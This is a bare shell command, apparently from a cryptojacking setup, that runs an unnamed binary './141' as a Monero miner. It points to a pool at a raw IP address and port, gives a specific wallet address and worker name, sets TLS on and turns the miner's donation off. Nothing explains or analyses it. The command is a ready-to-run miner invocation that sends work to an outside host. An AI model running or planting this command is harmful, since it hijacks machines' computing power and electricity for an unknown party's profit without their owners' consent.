./141
 --donate-level 0 -o 43.159.230.229:22691 -u
47se1HemMcAi3JZYeL8sXcBK9Ven4CHCd2o8mBpGWu77Msp247NgQ1STz99LArGEqbfktDBd1LUByiwoPh6ok1TSL8EAqBu.kil12.132
 --tls --coin monero